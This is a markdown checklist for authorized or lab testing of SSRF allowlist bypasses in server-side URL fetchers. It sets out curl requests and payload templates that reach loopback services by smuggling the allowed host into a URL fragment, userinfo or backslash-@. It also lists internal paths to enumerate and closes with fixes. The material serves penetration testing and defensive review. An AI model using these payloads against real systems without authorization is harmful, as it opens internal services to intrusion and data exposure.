# SSRF Fragment Allowlist Recon Checklist

## Goal

Determine whether a server-side fetcher uses substring or prefix allowlist logic that can be bypassed with URL fragments to reach loopback or internal services.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host and date.
- Do not copy live flags, tokens, cookies, or private webhook URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Internal target hint (if any):
```

## 2. Map The Fetch Surface

Find:

- `POST /api/fetch`
- `/fetch`
- preview/unfurl/webhook endpoints

Record:

```text
Endpoint:
Parameter:
Method:
Response field with body:
Error text for blocked destinations:
```

## 3. Discover The Allowed Destination

Test common hosts and the app itself:

```bash
curl -sS -X POST "https://[host]/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"https://[host]/"}'
```

Also test:

```text
https://example.com/
http://[host]/
https://[host]:443/
```

Record the exact allowed string:

```text
Allowed URL/origin:
Scheme requirement:
Hostname requirement:
Trailing slash sensitivity:
```

## 4. Confirm Direct Internal Block

```bash
curl -sS -X POST "https://[host]/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:[port]/"}'
```

Record:

```text
Direct loopback blocked: yes/no
Error message:
```

## 5. Test Parser-Confusion Baselines

Before fragment tests, quickly rule in or out:

```text
https://[allowed]@127.0.0.1:[port]/
http://127.0.0.1:[port]@[allowed]/
http://127.0.0.1:[port]\[@][allowed]/
http://127.0.0.1:[port]/[allowed-as-path]
https://127.0.0.1:[port]/?[allowed]
http://[decimal-ip]:[port]/
```

Record which families are blocked and whether failures happen before fetch.

If fragment fails but backslash-`@` works, see `notes/ssrf-backslash-userinfo-allowlist-bypass.md`.

## 6. Test Fragment Allowlist Smuggling

Use the discovered allowed URL exactly:

```text
http://127.0.0.1:[port]/#https://[allowed-host]/
http://127.0.0.1:[port]/[path]#https://[allowed-host]/
http://127.0.0.1:[port]/?x=#https://[allowed-host]/
```

Example:

```bash
curl -sS -X POST "https://[host]/api/fetch" \
  -H 'content-type: application/json' \
  -d '{"url":"http://127.0.0.1:9000/#https://[allowed-host]/"}'
```

Record:

```text
Fragment bypass works: yes/no
Response body signal:
Different from public app: yes/no
```

## 7. Enumerate Internal Paths

If the response mentions endpoints, use them before guessing:

```text
/secret
/openapi.json
/health
/admin
```

Payload shape:

```text
http://127.0.0.1:[port]/[path]#https://[allowed-host]/
```

## 8. Confirm Root Cause

Separate:

```text
Validation method: substring / startsWith / parsed host / other
Parser used for fetch:
Fragment role:
Final socket destination:
Response exposure:
```

## 9. Impact Proof

Prefer one read-only internal response that proves SSRF:

```text
metadata banner
internal route list
lab flag endpoint
harmless internal status page
```

Record:

```text
Proof endpoint:
Observed body:
Impact:
Limitations:
```

## 10. Fix Checklist

- Replace substring allowlists with parsed origin checks.
- Reject fragments and userinfo by default.
- Resolve DNS and block loopback/private/metadata IPs.
- Revalidate redirect destinations.
- Avoid returning raw internal bodies to untrusted users.

## Decision Checklist

- [ ] Fetch endpoint identified.
- [ ] Exact allowed destination string recorded.
- [ ] Direct loopback block confirmed.
- [ ] Userinfo bypass ruled in or out.
- [ ] Fragment smuggling tested.
- [ ] Internal response oracle identified.
- [ ] Minimal impact proof captured.
- [ ] Root cause documented as string-versus-parser mismatch.
- [ ] Reusable notes exclude live secrets.
